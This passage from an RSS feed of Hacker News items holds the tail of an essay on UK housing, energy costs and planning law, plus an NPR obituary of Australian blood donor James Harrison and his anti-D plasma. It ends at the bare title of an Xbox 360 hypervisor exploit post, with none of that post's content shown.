U.K. was more than twice as expensive as in France.</p><p data-flatplan-paragraph="true">There is an inconvenient subcurrent to the U.K.’s scarcity crisis—and ours. Sixty years ago, the environmentalist revolution transformed the way governments, courts, and individuals thought about their relationship to the natural world. This revolution was not only successful but, in many ways, enormously beneficial. In the U.S., the Clean Air Act and Clean Water Act <a data-event-element="inline link" href="https://www.gao.gov/blog/50-years-after-clean-water-act-gauging-progress">brought</a> about <a data-event-element="inline link" href="https://e360.yale.edu/features/delaware-river-clean-water-act">exactly</a><a data-event-element="inline link" href="https://www.epa.gov/transportation-air-pollution-and-climate-change/accomplishments-and-successes-reducing-air"> that</a>. But over time, American environmental rules, such as those in the National Environmental Policy Act and the California Environmental Quality Act, have been used to <a data-event-element="inline link" href="https://www.theatlantic.com/magazine/archive/2025/03/american-geographic-social-mobility/681439/">stop new housing developments</a> and, ironically, even <a data-event-element="inline link" href="https://www.ncpc.gov/docs/actions/2016June/GSA_Capital_Solar_Challenge_Recommendation_7789_June2016.pdf">clean</a>-<a data-event-element="inline link" href="https://www.liberalcurrents.com/the-case-for-abolishing-the-national-environmental-policy-act/">energy</a> <a data-event-element="inline link" href="https://www.noahpinion.blog/p/the-big-nepa-roundup">additions</a>. Similarly, in the U.K., any individual who sues to stop a new project on environmental grounds—say, to oppose a new road or airport—generally has their legal damages capped at £5,000, if they lose in court. “Once you’ve done that,” Bowman said, “you’ve created a one-way system, where people have little incentive to not bring spurious cases to challenge any new development.” Last year, Britain’s high-speed-rail initiative was compelled to spend an additional £100 million on a shield to protect bats in the woods of Buckinghamshire. Finding private investment is generally difficult for infrastructure developers when the path to completion is strewn with nine-figure surprise fees.</p><p data-flatplan-paragraph="true">Some of Britain’s problems echo across the European continent, including slow growth and high energy prices. More than a decade ago, Germany began to <a data-event-element="inline link" href="https://www.wsj.com/world/europe/why-germanys-confidence-is-shattered-and-its-economy-is-kaput-d1d95890?mod=hp_lead_pos9">phase out</a> nuclear power while failing to ramp up other energy production. The result has been catastrophic for citizens and for the ruling government. In the first half of 2024, Germans paid <a data-event-element="inline link" href="https://www.wsj.com/world/europe/why-germanys-confidence-is-shattered-and-its-economy-is-kaput-d1d95890?mod=hp_lead_pos9">the highest electricity prices in the European Union</a>. This month, Social Democrats were punished at the polls with their <a data-event-element="inline link" href="https://www.lemonde.fr/en/international/article/2025/02/26/germany-s-social-democrats-in-turmoil-after-historic-general-election-defeat_6738587_4.html">worst defeat since World War II</a>. Bowman offered a droll summary: “Europe has an energy problem; the Anglosphere has a housing problem; Britain has both.”</p><p data-flatplan-paragraph="true">These problems are obvious to many British politicians. Leaders in the Conservative and Labour Parties often comment on expensive energy and scarce housing. But their goals haven’t been translated into priorities and policies that lead to growth. “Few leaders in the U.K. have thought seriously about the scale of change that we need,” Bowman said. Comprehensive reform is necessary to unlock private investment in housing and energy—including overhauling the TCPA, reducing incentives for anti-growth lawsuits, and directly encouraging nuclear and gas production to build a bridge to a low-carbon-energy economy.</p><p data-flatplan-paragraph="true">Effective 21st-century governance requires something more than the ability to win elections by decrying the establishment and bemoaning sclerotic institutions. Progress requires a positive vision of the future, a deep understanding of the bottlenecks in the way of building that future, and a plan to add or remove policies to overcome those blockages. In a U.S. context, that might mean making it easier to build advanced semiconductors, or removing bureaucratic kludge for scientists while adding staff at the FDA to accelerate drug approval.</p><p id="injected-recirculation-link-2" data-view-action="view link - injected link - item 3" data-event-element="injected link" data-event-position="3"><a href="https://www.bloomberg.com/news/articles/2025-02-23/germany-s-social-democrats-ditch-scholz-after-historic-defeat">Read: A simple plan to solve all of America’s problems</a></p><p data-flatplan-paragraph="true">In the U.K., the bottlenecks are all too clear: Decades-old rules make it too easy for the state to block housing developments or for frivolous lawsuits to freeze out energy and infrastructure investment. In their conclusion, Bowman and his co-authors strike a similar tone. “Britain can enjoy such a renewal once more,” they write. “To do so, it need simply remove the barriers that stop the private sector from doing what it already wants to do.”</p></section><gpt-ad format="injector" sizes-at-0="mobile-wide,native,house" targeting-pos="injector-most-popular" sizes-at-976="desktop-wide,native,house"></gpt-ad></article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[James Harrison, whose blood donations saved >2M babies, has died (284 pts)]]></title>
            <link>https://www.npr.org/2025/03/03/nx-s1-5316163/james-harrison-blood-donor</link>
            <guid>43245129</guid>
            <pubDate>Mon, 03 Mar 2025 18:36:45 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.npr.org/2025/03/03/nx-s1-5316163/james-harrison-blood-donor">https://www.npr.org/2025/03/03/nx-s1-5316163/james-harrison-blood-donor</a>, See on <a href="https://news.ycombinator.com/item?id=43245129">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="storytext">
      <div id="resg-s1-51764">
            <div data-crop-type="">
        <picture>
            <source srcset="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/400/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg 400w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/600/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg 600w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/800/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg 800w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/900/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg 900w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/1200/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg 1200w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/1600/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg 1600w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/1800/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg 1800w" data-template="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/{width}/quality/{quality}/format/{format}/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg" sizes="(min-width: 1300px) 763px, (min-width: 1025px) calc(100vw - 496px), (min-width: 768px) calc(100vw - 171px), calc(100vw - 30px)" type="image/webp">
            <source srcset="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/400/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg 400w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/600/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg 600w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/800/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg 800w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/900/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg 900w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/1200/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg 1200w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/1600/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg 1600w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/1800/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg 1800w" data-template="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/{width}/quality/{quality}/format/{format}/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg" sizes="(min-width: 1300px) 763px, (min-width: 1025px) calc(100vw - 496px), (min-width: 768px) calc(100vw - 171px), calc(100vw - 30px)" type="image/jpeg">
            <img src="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/1100/quality/50/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg" data-template="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4649x3094+0+0/resize/{width}/quality/{quality}/format/{format}/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F03%2Fbe%2F1b1c2e3c4d289d8a9ca5c2fd2fb9%2Fgettyimages-995411052.jpg" alt="A man looks at a woman holding a baby while he sits on a recliner giving blood." fetchpriority="high">
        </picture>
</div>
<div>
    <div>
        <p>
                James Harrison looks at 8-month-old Layla and her mother, Beth Ismay, in Sydney, Australia, in May 2018. It was the last time Harrison donated blood.
                <b aria-label="Image credit">
                    
                    Subel Bhandari/Picture Alliance via Getty Images
                    
                </b>
                <b><b>hide caption</b></b>
            </p>


            <p><b><b>toggle caption</b></b>
    </p></div>

    <p><span aria-label="Image credit">
        
        Subel Bhandari/Picture Alliance via Getty Images
        
    </span>
</p></div>
   </div>
   <p>Australia's most prolific blood and plasma donor, James Harrison, has died at age 88. Known as the "Man with the Golden Arm," Harrison is credited with saving the lives of 2.4 million babies over the course of more than half a century.</p>   
   
<!-- END ID="RESNX-S1-5316163-100" CLASS="BUCKETWRAP INTERNALLINK INSETTWOCOLUMN INSET2COL " -->
   <p>Harrison died "peacefully in his sleep" at a nursing home on Feb. 17, Lifeblood — the Australian Red Cross branch responsible for blood donations — <a href="https://www.lifeblood.com.au/news-and-stories/media-centre/media-releases-and-statements/vale-james-harrison-oam" target="_blank">announced on Saturday</a>.</p>   <p>Harrison donated blood and plasma a whopping 1,173 times, according to Lifeblood, every two weeks between 1954 and 2018. All but 10 were from his right arm, the <a href="https://www.npr.org/sections/thetwo-way/2018/05/14/611074956/australias-man-with-the-golden-arm-retires-after-saving-2-4-million-babies" target="_blank"><em>Sydney Morning Herald</em></a> reported.</p>   <p>He "never missed a single appointment," the agency said, and "expected nothing in return." Blood donors are not compensated financially under <a href="https://www.health.gov.au/topics/blood-and-blood-products/what-were-doing-about-blood-and-blood-products" target="_blank">Australian law</a>.</p>   <p>"James was a remarkable, stoically kind, and generous person who was committed to a lifetime of giving and he captured the hearts of many people around the world," Lifeblood CEO Stephen Cornelissen said in a statement. </p>   
   <p>Harrison's plasma contained a rare and precious <a href="https://www.lifeblood.com.au/blood/learn-about-blood/plasma/anti-D" target="_blank">antibody called anti-D</a>, which was discovered in the mid-1960s. It is used in medications to prevent haemolytic disease of the fetus and newborn (HDFN) — also known as rhesus disease — a potentially fatal disease that occurs when a pregnant person's blood is incompatible with that of their unborn baby, prompting their immune system to attack it.</p>   
   
<!-- END ID="RESNX-S1-5316163-101" CLASS="BUCKETWRAP INTERNALLINK INSETTWOCOLUMN INSET2COL " -->
   <p>According to Lifeblood, 17% of Australian women who become pregnant end up needing anti-D injections — and most of the country's supply comes from a pool of less than 200 regular plasma donors.</p>   <p>Harrison became the country's first and most prolific anti-D donor, according to Lifeblood. In 1999, he received the Medal of the Order of Australia, one of the country's highest civilian honors. But he downplayed his accomplishments in interviews throughout the years, urging others to roll up their sleeves too.</p>   <p>"Some people say, 'Oh, you're a hero,' " <a href="https://www.npr.org/2015/06/14/414397424/man-with-the-golden-arm-donates-blood-thats-saved-2-million-babies" target="_blank">Harrison told NPR</a> in 2015. "But I'm in a safe room, donating blood. They give me a cup of coffee and something to nibble on. And then I just go on my way. … No problem, no hardship."<br></p>   <h3>Harrison started donating to repay others' generosity</h3>   <div id="resg-s1-51766">
            <div data-crop-type="">
        <picture>
            <source srcset="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/400/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg 400w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/600/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg 600w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/800/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg 800w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/900/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg 900w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/1200/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg 1200w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/1600/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg 1600w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/1800/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg 1800w" data-template="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/{width}/quality/{quality}/format/{format}/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg" sizes="(min-width: 1300px) 763px, (min-width: 1025px) calc(100vw - 496px), (min-width: 768px) calc(100vw - 171px), calc(100vw - 30px)" type="image/webp">
            <source srcset="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/400/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg 400w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/600/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg 600w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/800/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg 800w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/900/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg 900w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/1200/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg 1200w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/1600/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg 1600w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/1800/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg 1800w" data-template="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/{width}/quality/{quality}/format/{format}/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg" sizes="(min-width: 1300px) 763px, (min-width: 1025px) calc(100vw - 496px), (min-width: 768px) calc(100vw - 171px), calc(100vw - 30px)" type="image/jpeg">
            <img src="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/1100/quality/50/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg" data-template="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/4307x2864+0+0/resize/{width}/quality/{quality}/format/{format}/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F34%2Fbf%2F57188d874da286f360522c50a369%2Fgettyimages-975243976.jpg" alt="Harrison holds an index card documenting his blood donations in the 1960s." loading="lazy">
        </picture>
</div>
<div>
    <div>
        <p>
                At his last blood donation in 2018, James Harrison shows a card documenting his earlier donations.
                <b aria-label="Image credit">
                    
                    Subel Bhandari/picture alliance via Getty Images
                    
                </b>
                <b><b>hide caption</b></b>
            </p>


            <p><b><b>toggle caption</b></b>
    </p></div>

    <p><span aria-label="Image credit">
        
        Subel Bhandari/picture alliance via Getty Images
        
    </span>
</p></div>
   </div>
   <p>When Harrison was 14, he got sick and had to have one of his lungs removed.</p>   
   <p>The grueling process involved a three-month hospital stay, 100 stitches and nearly two gallons of donated blood, <a href="https://www.npr.org/2015/06/14/414397424/man-with-the-golden-arm-donates-blood-thats-saved-2-million-babies" target="_blank">he told NPR</a>. It inspired him to donate his own later — despite his <a href="https://www.lifeblood.com.au/news-and-stories/stories/james-harrison" target="_blank">aversion to needles</a>.</p>   <p>"I was always looking forward to donating, right from the operation, because I don't know how many people it took to save my life," he said. "I never met them, didn't know them."</p>   
   
<!-- END ID="RESNX-S1-5316163-102" CLASS="BUCKETWRAP INTERNALLINK INSETTWOCOLUMN INSET2COL " -->
   <p>In 1954, as soon as he hit the legal age of 18, Harrison started giving blood and plasma.</p>   <p>Scientists discovered the anti-D treatment for HDFN about a decade later, and Harrison soon learned his blood contained the rare life-saving antibody — which doctors believe has to do with the blood he received years earlier.</p>   <p>Once Harrison learned he possessed anti-D, <a href="https://www.lifeblood.com.au/news-and-stories/stories/james-harrison" target="_blank">Lifeblood says</a> he was "happy to continue to donate and switch over to plasma donation in order to help as many people as possible."</p>   <p>"I was prepared and wanted to give something back," Harrison said. "And I've been donating for 60 years."</p>   <p>Lifeblood says more than 3 million doses of anti-D containing Harrison's blood have been issued to Australian mothers since 1967. That long list of recipients includes members of his own family.<br></p>   <h3>His donations helped grow and inspire his own family</h3>   <p>Harrison's daughter, Tracey Mellowship, was among the women who received the injection while pregnant.</p>   <p>"As an anti-D recipient myself, he has left behind a family that may not have existed without his precious donations," she said in a statement, adding that her dad was "immensely proud" to have welcomed two great-grandchildren in his final years.</p>   <p>Harrison's contributions didn't just enable his family to grow, but to give back themselves.</p>   <p>"The whole family are blood donors," Harrison told NPR. "And that makes you feel proud, too."</p>   
   
<!-- END ID="RESNX-S1-5316163-103" CLASS="BUCKETWRAP INTERNALLINK INSETTWOCOLUMN INSET2COL " -->
   <p>In 2011, his grandson Scott made his first donation — seated right next to Harrison, who was making his 1,000th.</p>   <p>His late wife Barbara was a blood donor as well. Harrison kept donating "even in his darkest days," including after her death, Lifeblood says.</p>   <p>Mellowship said her dad was proud to have saved so many lives "without any cost or pain."</p>   <p>"It made him happy to hear about the many families like ours, who existed because of his kindness," Mellowship said. "He always said it does not hurt, and the life you save could be your own."</p>   <div id="resg-s1-51765">
            <div data-crop-type="">
        <picture>
            <source srcset="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/400/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg 400w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/600/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg 600w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/800/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg 800w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/900/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg 900w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/1200/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg 1200w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/1600/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg 1600w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/1800/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg 1800w" data-template="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/{width}/quality/{quality}/format/{format}/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg" sizes="(min-width: 1300px) 763px, (min-width: 1025px) calc(100vw - 496px), (min-width: 768px) calc(100vw - 171px), calc(100vw - 30px)" type="image/webp">
            <source srcset="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/400/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg 400w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/600/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg 600w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/800/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg 800w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/900/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg 900w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/1200/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg 1200w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/1600/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg 1600w,
https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/1800/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg 1800w" data-template="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/{width}/quality/{quality}/format/{format}/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg" sizes="(min-width: 1300px) 763px, (min-width: 1025px) calc(100vw - 496px), (min-width: 768px) calc(100vw - 171px), calc(100vw - 30px)" type="image/jpeg">
            <img src="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/1100/quality/50/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg" data-template="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/2880x1807+0+0/resize/{width}/quality/{quality}/format/{format}/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2Fc9%2F58%2Fb6358b494527955859a12f12a857%2Fgettyimages-1079006630.jpg" alt="A black and white photo of Harrison giving blood." loading="lazy">
        </picture>
</div>
<div>
    <div>
        <p>
                James Harrison, pictured giving his 537th blood donation in December 1992.
                <b aria-label="Image credit">
                    
                    Simon Alekna/Fairfax Media Archive via Getty Images
                    
                </b>
                <b><b>hide caption</b></b>
            </p>


            <p><b><b>toggle caption</b></b>
    </p></div>

    <p><span aria-label="Image credit">
        
        Simon Alekna/Fairfax Media Archive via Getty Images
        
    </span>
</p></div>
   </div>
   <h3>He continues to advance scientific research</h3>   <p>Harrison <a href="https://www.npr.org/sections/thetwo-way/2018/05/14/611074956/australias-man-with-the-golden-arm-retires-after-saving-2-4-million-babies" target="_blank">officially retired</a> at age 81, the <a href="https://www.lifeblood.com.au/faq/eligibility/other/age" target="_blank">maximum age</a> for blood donations under Australian law.</p>   
   <p>He made his last donation in May 2018, surrounded by half a dozen grateful mothers holding babies who benefited from the anti-D program.</p>   <p>From the blood center recliner, Harrison bemoaned his forced retirement, telling the<em> </em><a href="https://www.smh.com.au/healthcare/final-donation-for-man-whose-blood-helped-save-2-4-million-babies-20180511-p4zerp.html" target="_blank"><em>Sydney Morning Herald</em></a> that "I'd keep on going if they let me."</p>   <p>But he also spoke optimistically about passing the baton — or, more accurately, the squishy stress ball.</p>   <p>"I hope it's a record that somebody breaks, because it will mean they are dedicated to the cause," he said.</p>   
   
<!-- END ID="RESNX-S1-5316163-104" CLASS="BUCKETWRAP INTERNALLINK INSETTWOCOLUMN INSET2COL " -->
   <p>Australia has about 200 anti-D donors who help around 45,000 mothers and babies annually, according to Lifeblood.</p>   <p>But because the antibody is so rare, and there are so few human donors able to donate regularly, scientists are also trying to come up with a synthetic version.</p>   <p>Lifeblood is working with Walter and Eliza Hall Institute of Medical Research (WEHI), Australia's oldest research institute, on a project they call "James in a Jar." It could see Harrison continue to save lives long after his death.</p>   <p>"Using the blood of James and other donors, the team has successfully recreated and grown his antibody in the lab — with the hope it will one day help prevent [HDFN], not just for pregnant women in Australia, but also worldwide," it says.</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Hacking the Xbox 360 Hypervisor Part 2: The Bad Update Exploit (243 pts)]]></title>
            <link>https://icode4.coffee/?p=1081</link>
            <guid>43244739</guid>
            <pubDate>Mon, 03 Mar 2025 18:06:17 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://icode4.coffee/?p=1081">https://icode4.coffee/?p=1081</a>, See on <a href="https://news.ycombinator.com/item?id=43244739">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
									
									
